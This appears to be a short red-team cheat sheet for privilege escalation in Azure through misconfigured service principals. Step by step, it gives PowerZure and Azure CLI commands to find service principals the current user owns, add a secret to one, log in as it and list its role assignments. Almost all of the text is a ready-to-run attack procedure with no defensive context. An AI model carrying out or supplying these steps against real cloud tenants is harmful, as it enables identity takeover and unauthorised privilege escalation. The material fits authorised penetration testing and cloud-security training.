# Misconfigured Service Principals Privesc

### Tools: Powerzure

## Steps:

#### 1) Import Powerzure module

    Import-Module Powerzure.ps1 

#### 2) Verify whether the current user is assigned as the owner of a service principal

    Get-AzureAppOwner 

#### 3) Add a new secret to APP_NAME to allow us to authenticate with the app

    Add-AzureSPSecret -ApplicationName APP_NAME -Password PASSWORD 

    $Credential = Get-Credential

    Connect-AzAccount -Credential $Credential -Tenant TENANT_ID -ServicePrincipal (Windows Powershell)

## OR

    az login --service-principal --username APP_ID --password PASSWORD --tenant TENANT_ID (Azure CLI)

## NOTE: Don't forget to make a note of the APP_ID to authenticate as the service principal!

#### 4) Verify the role assignment and scope of the service principal

    az role assignment list --assignee APP_ID --include-groups --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}' 
